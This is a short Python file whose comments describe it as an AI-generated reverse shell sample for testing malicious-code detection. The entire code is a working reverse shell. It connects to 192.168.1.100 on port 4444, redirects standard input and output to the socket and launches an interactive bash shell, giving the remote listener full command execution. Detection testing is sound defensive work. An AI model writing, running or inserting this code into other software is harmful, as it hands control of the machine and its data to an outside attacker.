# AI-Generated Reverse Shell Sample
# This is a test sample for AI malicious detection
# Note: This code was generated for testing purposes only

import socket
import subprocess
import os
import sys

def main():
    """Main function to establish reverse shell connection."""
    # Define connection parameters
    HOST = "192.168.1.100"
    PORT = 4444
    
    # Create socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Redirect stdin, stdout, stderr
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # Execute shell
    subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    main()
